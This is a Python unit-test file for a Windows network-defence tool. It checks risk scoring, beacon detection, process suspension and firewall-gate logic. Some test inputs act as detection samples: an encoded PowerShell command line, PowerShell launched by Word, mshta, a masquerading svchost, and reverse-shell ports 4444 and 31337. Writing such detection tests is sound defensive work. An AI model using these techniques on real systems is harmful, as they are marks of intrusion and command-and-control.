"""OSに触れない単体テスト（標準ライブラリのみ）。実行: python tests.py"""
import os
import random
import struct
import tempfile
import time
import unittest
import xml.etree.ElementTree as ET
from datetime import datetime, timedelta, timezone
from html import escape
from pathlib import Path
from unittest import mock

from guardian import eventlog
from guardian.sysmonrules import (
    assess_dns, assess_persistence, dead_drop_service, is_run_key, parse_event, registered_path,
)
from guardian.sysmonrules import is_persistence_key
from guardian.traps import TRAP_SPECS, TrapHit, TrapManager, hit_from_event, is_benign_reader, is_owner
from guardian.winstatus import build_rows
from guardian.characters import CHARACTERS, DEFAULT_CHARACTER, get_character
from guardian.engine import KEEP, RESUME, SUSPEND, TERMINATE, TRUST, Engine
from guardian.launchwatch import assess_launch
from guardian.models import HIGH, LOW, MEDIUM, Assessment, BlockedConnect, Conn, Context, ProcFacts
from guardian.pemeta import parse_pe
from guardian.report import BAD as NOTE_BAD, GOOD, INFO, WARN, ModuleInfo, ProcessInfo, ProgramReport, build_notes
from guardian.reportview import report_html, report_text
from guardian.risk import assess, classify_location, is_beacon, is_external, is_loopback
from guardian.signinfo import REVOKED, TAMPERED, UNSIGNED, UNTRUSTED, VALID, CertInfo, SignatureInfo
from guardian.store import Store

ROOT = r"C:\Windows"
PS_REAL = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32", "WindowsPowerShell", "v1.0", "powershell.exe")
OUT = lambda port=443, **kw: Context(direction="outbound", remote_port=port, **kw)  # noqa: E731


def proc(path, signature="unsigned", parent=None, cmd=None, pid=100, created=1, name=None):
    return ProcFacts(pid, created, name or path.rsplit("\\", 1)[-1], path, parent, cmd, signature)


class AddressTests(unittest.TestCase):
    def test_external(self):
        self.assertTrue(is_external("8.8.8.8"))
        self.assertTrue(is_external("2001:4860:4860::8888"))
        self.assertTrue(is_external("::ffff:8.8.8.8"))
        for ip in ("127.0.0.1", "192.168.1.5", "10.0.0.1", "169.254.1.1", "::1", "fe80::1", "224.0.0.1", "0.0.0.0", "x"):
            self.assertFalse(is_external(ip), ip)

    def test_loopback(self):
        self.assertTrue(is_loopback("127.0.0.1"))
        self.assertTrue(is_loopback("::1"))
        self.assertFalse(is_loopback("0.0.0.0"))


class LocationTests(unittest.TestCase):
    def test_locations(self):
        cases = {
            r"C:\Windows\System32\svchost.exe": "system",
            r"C:\Windows\Temp\a.exe": "risky",
            r"C:\Program Files\App\a.exe": "program",
            r"D:\Program Files (x86)\App\a.exe": "program",
            r"C:\Users\u\Downloads\a.exe": "risky",
            r"C:\Users\u\AppData\Local\Temp\a.exe": "risky",
            r"C:\Users\Public\a.exe": "risky",
            r"C:\Users\u\AppData\Roaming\a.exe": "appdata",
            r"D:\tools\a.exe": "other",
        }
        for path, expected in cases.items():
            self.assertEqual(classify_location(path, ROOT), expected, path)
        self.assertEqual(classify_location(None, ROOT), "unknown")


class RiskTests(unittest.TestCase):
    def level(self, p, ctx):
        return assess(p, ctx, ROOT)

    def test_signed_browser_is_low(self):
        a = self.level(proc(r"C:\Program Files\Google\Chrome\chrome.exe", "valid"), OUT(distinct_ips_60s=30))
        self.assertEqual(a.level, LOW)

    def test_windows_service_is_low(self):
        a = self.level(proc(r"C:\Windows\System32\svchost.exe", "unsigned"), OUT())
        self.assertEqual(a.level, LOW)

    def test_unsigned_program_files_is_low(self):
        self.assertEqual(self.level(proc(r"C:\Program Files\Old\old.exe"), OUT()).level, LOW)

    def test_unsigned_downloads_c2_port_is_high(self):
        a = self.level(proc(r"C:\Users\u\Downloads\invoice.exe"), OUT(4444, first_seen=True))
        self.assertEqual(a.level, HIGH)
        self.assertGreaterEqual(a.score, 80)

    def test_unsigned_temp_https_is_medium(self):
        self.assertEqual(self.level(proc(r"C:\Users\u\AppData\Local\Temp\a.exe"), OUT()).level, MEDIUM)

    def test_temp_beacon_escalates_to_high(self):
        a = self.level(proc(r"C:\Users\u\AppData\Local\Temp\a.exe"), OUT(beacon=True))
        self.assertEqual(a.level, HIGH)

    def test_masquerade_is_high(self):
        a = self.level(proc(r"C:\Users\u\svchost.exe", "valid"), OUT())
        self.assertEqual(a.level, HIGH)
        self.assertNotIn("signed", [r.code for r in a.reasons])

    def test_plain_powershell_is_medium(self):
        p = proc(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
        self.assertEqual(self.level(p, OUT()).level, MEDIUM)

    def test_encoded_powershell_is_high(self):
        p = proc(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", cmd="powershell -enc AAAA")
        self.assertEqual(self.level(p, OUT()).level, HIGH)

    def test_office_child_powershell_is_high(self):
        p = proc(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe", parent="WINWORD.EXE")
        self.assertEqual(self.level(p, OUT()).level, HIGH)

    def test_lolbin_signed_gets_no_bonus(self):
        p = proc(r"C:\Windows\System32\mshta.exe", "valid")
        a = self.level(p, OUT())
        self.assertEqual(a.level, MEDIUM)
        self.assertNotIn("signed", [r.code for r in a.reasons])

    def test_invalid_signature(self):
        a = self.level(proc(r"C:\tools\a.exe", "invalid"), OUT())
        self.assertEqual(a.level, MEDIUM)

    def test_listen_rules(self):
        self.assertEqual(self.level(proc(r"C:\Windows\System32\svchost.exe"), Context("listen", local_port=135)).level, LOW)
        self.assertEqual(
            self.level(proc(r"C:\Users\u\Downloads\a.exe"), Context("listen", local_port=8000)).level, HIGH,
        )

    def test_inbound_rdp_is_medium_for_system(self):
        a = self.level(proc(r"C:\Windows\System32\svchost.exe"), Context("inbound", local_port=3389))
        self.assertIn("sensitive_inbound", [r.code for r in a.reasons])
        self.assertEqual(a.level, MEDIUM)
        signed = self.level(proc(r"C:\Windows\System32\svchost.exe", "valid"), Context("inbound", local_port=3389))
        self.assertEqual(signed.level, MEDIUM)

    def test_score_is_clamped(self):
        a = self.level(proc(r"C:\Users\u\Downloads\svchost.exe", "invalid"), OUT(4444, first_seen=True, beacon=True))
        self.assertEqual(a.score, 100)
        self.assertEqual(self.level(proc(r"C:\Windows\a.exe", "valid"), OUT()).score, 0)


class BeaconTests(unittest.TestCase):
    def test_regular_is_beacon(self):
        self.assertTrue(is_beacon([0, 30, 60.5, 90, 120.2]))

    def test_irregular_or_fast_is_not(self):
        self.assertFalse(is_beacon([0, 5, 90, 91, 300]))
        self.assertFalse(is_beacon([0, 1, 2, 3, 4]))
        self.assertFalse(is_beacon([0, 30, 60]))


class StateNameTests(unittest.TestCase):
    def test_state_mapping(self):
        from guardian.winapi import state_name

        self.assertEqual(state_name(2, "0.0.0.0", 0), "LISTEN")
        self.assertEqual(state_name(0, "0.0.0.0", 0), "LISTEN")
        self.assertEqual(state_name(0, "::", 0), "LISTEN")
        self.assertEqual(state_name(2, "104.18.39.21", 443), "UNKNOWN")
        self.assertEqual(state_name(0, "104.18.39.21", 443), "UNKNOWN")
        self.assertEqual(state_name(5, "8.8.8.8", 443), "ESTABLISHED")
        self.assertEqual(state_name(8, "8.8.8.8", 443), "CLOSING")
        self.assertEqual(state_name(11, "8.8.8.8", 443), "OTHER")
        self.assertEqual(state_name(1, "0.0.0.0", 0), "OTHER")


class FakeSource:
    def __init__(self):
        self.conns = []

    def snapshot(self):
        return list(self.conns)


class FakeInspector:
    def __init__(self):
        self.procs = {}
        self.hashes = {}

    def add(self, facts):
        self.procs[facts.pid] = facts

    def created(self, pid):
        return self.procs[pid].created if pid in self.procs else 0

    def inspect(self, pid):
        return self.procs.get(pid, ProcFacts(pid, 0, f"PID {pid}"))

    def file_hash(self, path):
        return self.hashes.get(path, "hash-1")

    def inspect_image(self, app_id):
        for facts in self.procs.values():
            if app_id_of(facts.path) == app_id:
                return facts
        path = next((p for p in self.exited if app_id_of(p) == app_id), None)
        return ProcFacts(0, 0, app_id.rsplit("\\", 1)[-1], path, None, None, "unsigned")

    exited = ()


def app_id_of(path):
    return "\\device\\harddiskvolume1" + path[2:].lower()


class FakeActions:
    def __init__(self):
        self.calls = []
        self.suspend_ok = True

    def suspend(self, pid):
        self.calls.append(("suspend", pid))
        return self.suspend_ok

    def resume(self, pid):
        self.calls.append(("resume", pid))
        return True

    def terminate(self, pid):
        self.calls.append(("terminate", pid))
        return True

    def disconnect(self, conn):
        self.calls.append(("disconnect", conn.pid))
        return True


BAD = r"C:\Users\u\Downloads\bad.exe"
TEMP = r"C:\Users\u\AppData\Local\Temp\tool.exe"


def conn(pid=100, ip="8.8.8.8", port=4444, lport=50000, state="ESTABLISHED"):
    return Conn("192.168.1.2", lport, ip, port, state, pid)


class EngineTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.store = Store(self.tmp.name)
        self.source = FakeSource()
        self.inspector = FakeInspector()
        self.actions = FakeActions()
        self.alerts = []
        self.now = 1000.0
        self.engine = self.make_engine()
        self.engine.self_pids = {99}
        self.inspector.add(proc(BAD, pid=100))
        self.inspector.add(proc(TEMP, pid=200))

    def make_engine(self, **kw):
        return Engine(
            self.source, self.inspector, self.actions, self.store,
            on_alert=self.alerts.append, clock=lambda: self.now, self_pids={99}, **kw,
        )

    def poll(self, *conns):
        self.source.conns = list(conns)
        self.engine.poll_once()

    def test_high_risk_is_suspended_and_disconnected(self):
        self.poll(conn())
        self.assertEqual(len(self.alerts), 1)
        self.assertEqual(self.alerts[0].action, "suspended")
        self.assertIn(("suspend", 100), self.actions.calls)
        self.assertIn(("disconnect", 100), self.actions.calls)
        self.assertEqual(self.engine.suspended_count(), 1)

    def test_inbound_alerts_once_per_source(self):
        self.engine = self.make_engine(assess_fn=lambda _f, _c: Assessment(50, MEDIUM, []))
        listener = Conn("0.0.0.0", 3389, "0.0.0.0", 0, "LISTEN", 100)
        first = conn(ip="8.8.8.8", port=55555, lport=3389)
        self.poll(listener, first)
        self.poll(listener, first, conn(ip="8.8.8.8", port=55556, lport=3389))
        self.poll(listener, conn(ip="1.1.1.1", port=55555, lport=3389))
        sources = [a.conn.remote_ip for a in self.alerts if a.direction == "inbound"]
        self.assertEqual(sources, ["8.8.8.8", "1.1.1.1"])

    def test_inbound_alerts_are_capped(self):
        self.engine = self.make_engine(assess_fn=lambda _f, _c: Assessment(50, MEDIUM, []))
        listener = Conn("0.0.0.0", 3389, "0.0.0.0", 0, "LISTEN", 100)
        self.poll(listener, *[conn(ip=f"8.8.4.{i}", port=55555, lport=3389) for i in range(1, 40)])
        self.assertEqual(sum(a.direction == "inbound" for a in self.alerts), 20)

    def test_medium_only_asks(self):
        self.poll(conn(pid=200, port=443))
        self.assertEqual(self.alerts[0].action, "ask")
        self.assertEqual(self.actions.calls, [])

    def test_same_connection_is_not_alerted_twice(self):
        self.poll(conn(pid=200, port=443))
        self.poll(conn(pid=200, port=443))
        self.poll(conn(pid=200, port=443, lport=50001))
        self.assertEqual(len(self.alerts), 1)

    def test_level_escalation_alerts_again(self):
        self.poll(conn(pid=200, port=443))
        self.poll(conn(pid=200, port=443), conn(pid=200, port=4444, lport=50001))
        self.assertEqual([a.action for a in self.alerts], ["ask", "suspended"])

    def test_private_and_loopback_ignored(self):
        self.poll(conn(ip="192.168.1.9"), conn(ip="127.0.0.1"))
        self.assertEqual(self.alerts, [])

    def test_self_is_ignored(self):
        self.inspector.add(proc(BAD, pid=99))
        self.poll(conn(pid=99))
        self.assertEqual(self.alerts, [])

    def test_observe_never_suspends(self):
        self.engine.observe = True
        self.poll(conn())
        self.assertEqual(self.alerts[0].action, "observe")
        self.assertEqual(self.actions.calls, [])
        ok, _ = self.engine.decide(self.alerts[0].id, SUSPEND)
        self.assertFalse(ok)
        self.assertEqual(self.actions.calls, [])

    def test_protected_process_is_never_suspended(self):
        self.inspector.add(ProcFacts(300, 1, "svchost.exe", r"C:\Windows\System32\svchost.exe", None, None, "unsigned"))
        self.poll(conn(pid=300, port=3389, lport=3389), Conn("0.0.0.0", 3389, "0.0.0.0", 0, "LISTEN", 300))
        self.assertEqual(self.alerts[0].action, "ask")
        self.assertEqual(self.actions.calls, [])
        facts = self.inspector.procs[300]
        self.assertTrue(self.engine.is_protected(facts))

    def test_masquerading_svchost_is_not_protected(self):
        self.inspector.add(proc(r"C:\Users\u\svchost.exe", pid=301))
        self.poll(conn(pid=301, port=443))
        self.assertEqual(self.alerts[0].action, "suspended")
        self.assertIn(("suspend", 301), self.actions.calls)

    def test_suspend_failure_is_reported(self):
        self.actions.suspend_ok = False
        self.poll(conn())
        self.assertEqual(self.alerts[0].action, "suspend_failed")
        self.assertEqual(self.engine.suspended_count(), 0)

    def test_resume_allows_process_until_exit(self):
        self.poll(conn())
        ok, _ = self.engine.decide(self.alerts[0].id, RESUME)
        self.assertTrue(ok)
        self.assertIn(("resume", 100), self.actions.calls)
        self.assertEqual(self.engine.suspended_count(), 0)
        self.poll(conn(), conn(port=31337, lport=50001))
        self.assertEqual(len(self.alerts), 1)
        self.inspector.add(proc(BAD, pid=100, created=2))  # 同じPIDの別プロセス
        self.poll(conn(lport=50002))
        self.assertEqual(len(self.alerts), 2)

    def test_terminate(self):
        self.poll(conn())
        ok, _ = self.engine.decide(self.alerts[0].id, TERMINATE)
        self.assertTrue(ok)
        self.assertIn(("terminate", 100), self.actions.calls)
        self.assertEqual(self.engine.pending(), [])
        self.assertEqual(self.engine.suspended_count(), 0)

    def test_keep_leaves_pending_and_suspended(self):
        self.poll(conn())
        self.engine.decide(self.alerts[0].id, KEEP)
        self.assertEqual(len(self.engine.pending()), 1)
        self.assertEqual(self.engine.suspended_count(), 1)

    def test_decide_twice_is_rejected(self):
        self.poll(conn())
        self.engine.decide(self.alerts[0].id, RESUME)
        ok, _ = self.engine.decide(self.alerts[0].id, RESUME)
        self.assertFalse(ok)
        self.assertEqual(self.actions.calls.count(("resume", 100)), 1)

    def test_medium_can_be_suspended_by_user(self):
        self.poll(conn(pid=200, port=443))
        ok, _ = self.engine.decide(self.alerts[0].id, SUSPEND)
        self.assertTrue(ok)
        self.assertIn(("suspend", 200), self.actions.calls)
        self.assertEqual(self.engine.suspended_count(), 1)

    def test_trust_survives_restart_until_file_changes(self):
        self.poll(conn())
        self.engine.decide(self.alerts[0].id, TRUST)
        self.alerts.clear()
        self.actions.calls.clear()
        self.engine = self.make_engine()
        self.inspector.add(proc(BAD, pid=100, created=5))
        self.poll(conn())
        self.assertEqual(self.alerts, [])
        self.engine = self.make_engine()  # ファイルが書き換えられた
        self.inspector.hashes[BAD] = "hash-2"
        self.inspector.add(proc(BAD, pid=100, created=6))
        self.poll(conn())
        self.assertEqual(self.alerts[0].action, "suspended")

    def test_shutdown_resumes_suspended(self):
        self.poll(conn())
        self.engine.shutdown()
        self.assertIn(("resume", 100), self.actions.calls)
        self.assertEqual(self.store.load_suspended(), [])

    def test_crash_recovery_keeps_stopped_and_asks(self):
        self.poll(conn())
        self.assertEqual(len(self.store.load_suspended()), 1)
        self.alerts.clear()
        self.actions.calls.clear()
        engine = self.make_engine()
        engine.recover_suspended()
        self.assertEqual(self.alerts[0].action, "recovered")
        self.assertEqual(self.actions.calls, [])
        self.assertEqual(engine.suspended_count(), 1)
        ok, _ = engine.decide(self.alerts[0].id, RESUME)
        self.assertTrue(ok)
        self.assertIn(("resume", 100), self.actions.calls)

    def test_recovery_ignores_reused_pid(self):
        self.poll(conn())
        self.alerts.clear()
        self.inspector.add(proc(BAD, pid=100, created=99))
        engine = self.make_engine()
        engine.recover_suspended()
        self.assertEqual(self.alerts, [])
        self.assertEqual(self.store.load_suspended(), [])

    def test_new_app_points_only_after_baseline(self):
        goodish = r"C:\tools\tool.exe"
        self.inspector.add(proc(goodish, pid=400))
        self.poll(conn(pid=400, port=443))
        self.assertEqual(self.engine.rows()[0]["score"], 15)
        self.store = Store(tempfile.mkdtemp(dir=self.tmp.name))
        self.engine = self.make_engine()
        self.poll()
        self.poll(conn(pid=400, port=443))
        self.assertEqual(self.engine.rows()[0]["score"], 25)

    def test_low_app_is_learned(self):
        goodish = r"C:\tools\tool.exe"
        self.inspector.add(proc(goodish, pid=400))
        self.poll(conn(pid=400, port=443))
        self.assertTrue(self.store.is_seen(goodish))

    def test_high_risk_app_is_not_learned(self):
        self.poll(conn())
        self.assertFalse(self.store.is_seen(BAD))

    def test_state_change_is_not_a_new_connection(self):
        # 接続中→確立→切断処理中 と変わっても、接続回数は1回として数える
        self.inspector.add(proc(TEMP, pid=200))
        for state in ("SYN_SENT", "ESTABLISHED", "CLOSING"):
            self.now += 30
            self.poll(conn(pid=200, port=443, state=state))
        state = next(iter(self.engine._states.values()))
        self.assertEqual(len(state.connect_times["8.8.8.8"]), 1)

    def test_short_connection_seen_only_while_closing_is_detected(self):
        self.poll(conn(state="CLOSING"))
        self.assertEqual(self.alerts[0].action, "suspended")

    def test_unknown_state_is_still_judged(self):
        self.poll(conn(state="UNKNOWN"))
        self.assertEqual(self.alerts[0].action, "suspended")

    def test_regular_reconnects_escalate_to_high(self):
        for i in range(5):
            self.now += 30
            self.poll(conn(pid=200, port=443, lport=50000 + i))
            self.poll()
        self.assertEqual([a.action for a in self.alerts], ["ask", "suspended"])
        self.assertIn("beacon", [r.code for r in self.alerts[1].assessment.reasons])

    def test_events_are_logged(self):
        self.poll(conn())
        self.engine.decide(self.alerts[0].id, RESUME)
        events = self.store.recent_events()
        self.assertEqual([e["event"] for e in events], ["decision", "detected"])


class FakeGate:
    def __init__(self):
        self.active = False
        self.queue = []
        self.permitted = []
        self.enabled_with = []
        self.enable_ok = True
        self.permit_ok = True
        self.disabled = 0
        self.last_error = ""

    def enable(self, known_paths, extra_app_ids=()):
        self.enabled_with.append((list(known_paths), list(extra_app_ids)))
        self.active = self.enable_ok
        return self.enable_ok

    def disable(self):
        self.active = False
        self.disabled += 1

    def permit(self, app_id):
        if self.permit_ok:
            self.permitted.append(app_id)
        return self.permit_ok

    def drain(self):
        events, self.queue = self.queue, []
        return events


SIGNED = r"C:\Program Files\App\app.exe"
POWERSHELL = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"


class GateEngineTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.store = Store(self.tmp.name)
        self.source = FakeSource()
        self.inspector = FakeInspector()
        self.actions = FakeActions()
        self.gate = FakeGate()
        self.alerts = []
        self.now = 1000.0
        self.inspector.add(proc(BAD, pid=100))
        self.inspector.add(proc(TEMP, pid=200))
        self.inspector.add(proc(SIGNED, "valid", pid=300))
        self.engine = self.make_engine()

    def make_engine(self, **kw):
        return Engine(
            self.source, self.inspector, self.actions, self.store, on_alert=self.alerts.append,
            clock=lambda: self.now, self_pids={99}, gate=self.gate, **kw,
        )

    def block(self, path, port=443, ip="8.8.8.8"):
        self.gate.active = True  # 遮断イベントは遮断中にしか届かない
        self.gate.queue.append(BlockedConnect(app_id_of(path), ip, port, 6, self.now))
        self.engine.poll_once()

    def test_low_risk_app_is_permitted_without_alert(self):
        self.block(SIGNED)
        self.assertEqual(self.gate.permitted, [app_id_of(SIGNED)])
        self.assertEqual(self.alerts, [])
        self.assertTrue(self.store.is_seen(SIGNED))

    def test_medium_stays_blocked_and_asks_without_suspending(self):
        self.block(TEMP)
        self.assertEqual(self.alerts[0].action, "blocked")
        self.assertEqual(self.alerts[0].gate_app, app_id_of(TEMP))
        self.assertEqual(self.gate.permitted, [])
        self.assertEqual(self.actions.calls, [])

    def test_high_is_suspended_and_stays_blocked(self):
        self.block(BAD, port=4444)
        self.assertEqual(self.alerts[0].action, "suspended")
        self.assertIn(("suspend", 100), self.actions.calls)
        self.assertEqual(self.gate.permitted, [])

    def test_retries_do_not_alert_twice(self):
        self.block(TEMP)
        self.now += 1
        self.block(TEMP)
        self.assertEqual(len(self.alerts), 1)

    def test_burst_in_one_poll_is_judged_once(self):
        event = BlockedConnect(app_id_of(TEMP), "8.8.8.8", 443, 6, self.now)
        self.gate.queue.extend([event, event, event])
        self.engine.poll_once()
        self.assertEqual(len(self.alerts), 1)

    def test_escalation_alerts_again(self):
        self.block(TEMP)
        self.block(TEMP, port=4444)
        self.assertEqual([a.action for a in self.alerts], ["blocked", "suspended"])

    def test_resume_permits_the_app(self):
        self.block(TEMP)
        ok, _ = self.engine.decide(self.alerts[0].id, RESUME)
        self.assertTrue(ok)
        self.assertEqual(self.gate.permitted, [app_id_of(TEMP)])
        self.block(TEMP)  # 許可を足す前に止まった接続の通知
        self.assertEqual(len(self.alerts), 1)

    def test_resume_after_suspend_resumes_and_permits(self):
        self.block(BAD, port=4444)
        self.engine.decide(self.alerts[0].id, RESUME)
        self.assertIn(("resume", 100), self.actions.calls)
        self.assertEqual(self.gate.permitted, [app_id_of(BAD)])

    def test_trust_is_remembered_and_permits_next_time(self):
        self.block(TEMP)
        self.engine.decide(self.alerts[0].id, TRUST)
        self.assertEqual(self.gate.permitted, [app_id_of(TEMP)])
        engine = self.make_engine()
        self.gate.permitted.clear()
        self.alerts.clear()
        self.gate.queue.append(BlockedConnect(app_id_of(TEMP), "8.8.8.8", 443, 6, self.now))
        engine.poll_once()
        self.assertEqual(self.gate.permitted, [app_id_of(TEMP)])
        self.assertEqual(self.alerts, [])

    def test_keep_does_not_permit(self):
        self.block(TEMP)
        self.engine.decide(self.alerts[0].id, KEEP)
        self.assertEqual(self.gate.permitted, [])

    def test_terminate_keeps_blocked_and_asks_again_next_launch(self):
        self.block(TEMP)
        self.engine.decide(self.alerts[0].id, TERMINATE)
        self.assertIn(("terminate", 200), self.actions.calls)
        self.assertEqual(self.gate.permitted, [])
        self.block(TEMP)
        self.assertEqual(len(self.alerts), 2)

    def test_exited_program_is_blocked_without_touching_pid_zero(self):
        gone = r"C:\Users\u\Downloads\gone.exe"
        self.inspector.exited = (gone,)
        self.block(gone, port=4444)
        self.assertEqual(self.alerts[0].action, "blocked")
        self.assertEqual(self.alerts[0].proc.pid, 0)
        self.assertEqual(self.actions.calls, [])
        ok, _ = self.engine.decide(self.alerts[0].id, TERMINATE)
        self.assertTrue(ok)
        self.assertEqual(self.actions.calls, [])
        self.assertEqual(self.gate.permitted, [])

    def test_protected_program_is_let_through_with_notice(self):
        fake = r"C:\Windows\System32\svchost.exe"
        self.inspector.add(ProcFacts(400, 1, "svchost.exe", fake, None, None, "unsigned"))
        engine = self.make_engine(assess_fn=lambda _f, _c: Assessment(90, HIGH, []))
        self.gate.queue.append(BlockedConnect(app_id_of(fake), "8.8.8.8", 443, 6, self.now))
        engine.poll_once()
        self.assertEqual(self.alerts[0].action, "protected")
        self.assertEqual(self.gate.permitted, [app_id_of(fake)])
        self.assertEqual(self.actions.calls, [])

    def test_failed_permit_is_retried(self):
        self.gate.permit_ok = False
        self.block(SIGNED)
        self.gate.permit_ok = True
        self.block(SIGNED)
        self.assertEqual(self.gate.permitted, [app_id_of(SIGNED)])

    def test_failed_permit_on_resume_reports_failure(self):
        self.block(TEMP)
        self.gate.active = True
        self.gate.permit_ok = False
        ok, _ = self.engine.decide(self.alerts[0].id, RESUME)
        self.assertFalse(ok)
        self.assertEqual(len(self.engine.pending()), 1)

    def test_unknown_app_is_logged_only(self):
        self.gate.queue.append(BlockedConnect("", "8.8.8.8", 443, 6, self.now))
        self.engine.poll_once()
        self.assertEqual(self.alerts, [])
        self.assertEqual(self.store.recent_events()[0]["event"], "gate_unknown_app")

    def test_error_in_one_event_does_not_stop_the_others(self):
        original = self.inspector.inspect_image

        def broken(app_id):
            if app_id == app_id_of(TEMP):
                raise OSError("boom")
            return original(app_id)

        self.inspector.inspect_image = broken
        self.gate.queue.append(BlockedConnect(app_id_of(TEMP), "8.8.8.8", 443, 6, self.now))
        self.block(SIGNED)
        self.assertEqual(self.gate.permitted, [app_id_of(SIGNED)])

    # --- オンとオフ
    def started(self):
        self.engine.poll_once()
        self.engine.sync_gate()

    def test_not_enabled_before_baseline(self):
        self.engine.sync_gate()
        self.assertEqual(self.gate.enabled_with, [])

    def test_enabled_after_baseline(self):
        self.started()
        self.assertTrue(self.gate.active)

    def test_never_enabled_in_observe_mode(self):
        self.engine = self.make_engine(observe=True)
        self.started()
        self.assertEqual(self.gate.enabled_with, [])

    def test_pause_disables_and_expiry_reenables_with_permits(self):
        self.started()
        self.block(SIGNED)
        self.engine.pause(60)
        self.engine.sync_gate()
        self.assertFalse(self.gate.active)
        self.now += 61
        self.engine.sync_gate()
        self.assertTrue(self.gate.active)
        self.assertEqual(self.gate.enabled_with[-1][1], [app_id_of(SIGNED)])

    def test_repeated_errors_release_the_block(self):
        self.started()
        self.engine.errors = 5
        self.engine.sync_gate()
        self.assertFalse(self.gate.active)

    def test_failed_enable_waits_before_retry(self):
        self.gate.enable_ok = False
        self.started()
        self.engine.sync_gate()
        self.assertEqual(len(self.gate.enabled_with), 1)
        self.now += 61
        self.engine.sync_gate()
        self.assertEqual(len(self.gate.enabled_with), 2)

    def test_shutdown_disables(self):
        self.started()
        self.engine.shutdown()
        self.assertFalse(self.gate.active)

    def test_decision_while_paused_is_included_at_next_enable(self):
        self.started()
        self.block(TEMP)
        self.engine.pause(60)
        self.engine.sync_gate()
        ok, _ = self.engine.decide(self.alerts[0].id, RESUME)
        self.assertTrue(ok)
        self.now += 61
        self.engine.sync_gate()
        self.assertIn(app_id_of(TEMP), self.gate.enabled_with[-1][1])

    # --- 最初から通すアプリ
    def test_known_apps_exclude_what_must_be_rejudged(self):
        for path in (SIGNED, POWERSHELL, BAD, r"C:\tools\svchost.exe", r"C:\tools\ok.exe"):
            self.store.mark_seen(path)
        known = {p.lower() for p in self.engine.known_app_paths()}
        self.assertEqual(known, {SIGNED.lower(), r"c:\tools\ok.exe"})

    def test_known_apps_include_explicitly_trusted(self):
        self.inspector.hashes[BAD] = "hash-1"
        self.store.add_trust(BAD, "hash-1")
        self.assertIn(BAD, self.engine.known_app_paths())

    def test_known_apps_never_include_trusted_shell(self):
        self.store.add_trust(POWERSHELL, "hash-1")
        self.assertNotIn(POWERSHELL, self.engine.known_app_paths())

    def test_known_apps_exclude_trusted_file_that_changed(self):
        self.store.mark_seen(SIGNED)
        self.store.add_trust(SIGNED, "hash-old")
        self.assertEqual(self.engine.known_app_paths(), [])


class WfpStructTests(unittest.TestCase):
    """Windows の定義（64ビット）と配置が一致すること。何も実行しない。"""

    def test_sizes(self):
        import ctypes

        from guardian import wfp

        expected = {
            wfp.FWP_BYTE_BLOB: 16, wfp.FWP_VALUE0: 16, wfp.FWP_V4_ADDR_AND_MASK: 8, wfp.FWP_V6_ADDR_AND_MASK: 17,
            wfp.FWPM_DISPLAY_DATA0: 16, wfp.FWPM_ACTION0: 20, wfp.FWPM_FILTER_CONDITION0: 40,
            wfp.FWPM_FILTER0: 200, wfp.FWPM_SESSION0: 72, wfp.FWPM_SUBLAYER0: 72,
            wfp.FWPM_NET_EVENT_HEADER1: 144, wfp.FWPM_NET_EVENT1: 160,
            wfp.FWPM_NET_EVENT_CLASSIFY_DROP1: 32, wfp.FWPM_NET_EVENT_SUBSCRIPTION0: 32,
        }
        for struct, size in expected.items():
            self.assertEqual(ctypes.sizeof(struct), size, struct.__name__)

    def test_offsets(self):
        from guardian import wfp

        self.assertEqual(wfp.FWPM_FILTER0.action.offset, 128)
        self.assertEqual(wfp.FWPM_FILTER0.filterId.offset, 176)
        self.assertEqual(wfp.FWPM_NET_EVENT_HEADER1.appId.offset, 64)
        self.assertEqual(wfp.FWPM_NET_EVENT_HEADER1.remotePort.offset, 54)
        self.assertEqual(wfp.FWPM_NET_EVENT1.type.offset, 144)
        self.assertEqual(wfp.FWPM_NET_EVENT1.classifyDrop.offset, 152)

    def test_guid_layout(self):
        import uuid

        from guardian import wfp

        self.assertEqual(
            bytes(wfp.LAYER_CONNECT_V4), uuid.UUID("c38d57d1-05a7-4c33-904f-7fbceee60e82").bytes_le,
        )


class WfpHelperTests(unittest.TestCase):
    def test_local_networks_are_never_external(self):
        from guardian import wfp

        for network in (*wfp.LOCAL_NETWORKS_V4, *wfp.LOCAL_NETWORKS_V6):
            self.assertFalse(is_external(str(network.network_address)), network)
            self.assertFalse(is_external(str(network.broadcast_address)), network)

    def test_public_addresses_are_not_in_local_networks(self):
        import ipaddress

        from guardian import wfp

        for ip in ("8.8.8.8", "1.1.1.1", "203.0.114.1"):
            self.assertFalse(any(ipaddress.ip_address(ip) in n for n in wfp.LOCAL_NETWORKS_V4), ip)
        for ip in ("2001:4860:4860::8888", "2606:4700::1111"):
            self.assertFalse(any(ipaddress.ip_address(ip) in n for n in wfp.LOCAL_NETWORKS_V6), ip)

    def test_sddl_has_owner_group_and_one_ace_per_user(self):
        from guardian import wfp

        self.assertEqual(
            wfp.sddl_for_users(["S-1-5-21-1", "S-1-5-21-2", "S-1-5-21-1"]),
            "O:SYG:SYD:(A;;CC;;;S-1-5-21-1)(A;;CC;;;S-1-5-21-2)",
        )

    def test_v4_condition_uses_host_order(self):
        import ipaddress

        from guardian import wfp

        target = wfp.cond_network(ipaddress.ip_network("10.0.0.0/8")).keep
        self.assertEqual((target.addr, target.mask), (0x0A000000, 0xFF000000))

    def test_v6_condition_keeps_prefix(self):
        import ipaddress

        from guardian import wfp

        target = wfp.cond_network(ipaddress.ip_network("fe80::/10")).keep
        self.assertEqual((bytes(target.addr)[:2], target.prefixLength), (b"\xfe\x80", 10))

    def test_filled_conditions(self):
        from guardian import wfp

        out = wfp.FWPM_FILTER_CONDITION0()
        wfp.cond_port(4444).fill(out)
        self.assertEqual((out.conditionValue.type, out.conditionValue.value.uint16), (wfp.FWP_UINT16, 4444))
        condition = wfp.cond_app("\\device\\a.exe")
        condition.fill(out)
        self.assertEqual(out.conditionValue.type, wfp.FWP_BYTE_BLOB_TYPE)
        blob = wfp.FWP_BYTE_BLOB.from_address(out.conditionValue.value.pointer)
        self.assertEqual(wfp._read_app_id(blob), "\\device\\a.exe")
